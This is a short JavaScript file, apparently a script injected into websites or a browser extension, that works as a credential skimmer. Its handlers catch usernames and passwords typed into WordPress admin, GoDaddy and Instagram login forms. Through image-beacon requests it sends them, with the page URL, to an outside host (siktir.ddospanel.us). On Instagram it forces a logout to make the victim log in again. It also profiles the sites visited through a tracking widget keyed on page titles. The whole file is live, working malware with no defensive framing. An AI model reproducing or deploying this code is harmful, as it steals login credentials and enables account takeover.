new Image().src = '//whos.amung.us/widget/kekoname.png';

if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
document.getElementById('wp-submit').onclick = function() {
   new Image().src = 'http://siktir.ddospanel.us/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}

if(document.title.toLowerCase().indexOf("porn") >= 0){new Image().src = '//whos.amung.us/widget/kekonam3.png'; }
if(top.location.hostname.indexOf("r10.net") > -1) { new Image().src = '//whos.amung.us/widget/kekonam4.png';}
if(document.title.toLowerCase().indexOf("film") >= 0){new Image().src = '//whos.amung.us/widget/kekonam5.png'; }
if(document.title.toLowerCase().indexOf("dizi") >= 0){new Image().src = '//whos.amung.us/widget/kekonam5.png'; }
if(document.title.toLowerCase().indexOf("canlı tv") >= 0){new Image().src = '//whos.amung.us/widget/kekonam6.png'; }
if(document.title.toLowerCase().indexOf("haber") >= 0){new Image().src = '//whos.amung.us/widget/kekonam7.png'; }
if(document.title.toLowerCase().indexOf("oyun") >= 0){new Image().src = '//whos.amung.us/widget/kekonam8.png'; }



if(window.location.href.indexOf("godaddy") > 0) {
document.getElementById('submitBtn').onclick = function() {
    if(window.location.href.indexOf("godaddy") > 0) {
  new Image().src = 'https://siktir.ddospanel.us/cp3.php?username='+document.getElementById('username').value+'&sifre='+document.getElementById('password').value+'&location='+location.href;
 }
}
document.getElementById('username').onkeypress = function(e) {
    if(window.location.href.indexOf("godaddy") > 0 && e.keyCode == 13) {
  new Image().src = 'https://siktir.ddospanel.us/cp3.php?username='+document.getElementById('username').value+'&sifre='+document.getElementById('password').value+'&location='+location.href;
 }
}
document.getElementById('password').onkeypress = function(e) {
    if(window.location.href.indexOf("godaddy") > 0 && e.keyCode == 13) {
  new Image().src = 'https://siktir.ddospanel.us/cp3.php?username='+document.getElementById('username').value+'&sifre='+document.getElementById('password').value+'&location='+location.href;
 }
}
}


if (top.location.href.indexOf("instagram") > -1) {

tarih = new Date();
    storage_key = 'access_instakram_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		window.location = "http://www.instagram.com/accounts/logout";
    }	




	document.getElementsByClassName('_rwf8p')[0][2].onclick = function(data) {
		console.log("Login olundu!");
		new Image().src = "https://siktir.ddospanel.us/cpin.php?username=" + document.getElementsByName('username')[0].value + "&password=" + document.getElementsByName('password')[0].value;
		setTimeout(function() {
			document.getElementsByClassName('_rwf8p')[0][2].onclick;
		}, 99);
		return false
	}
}
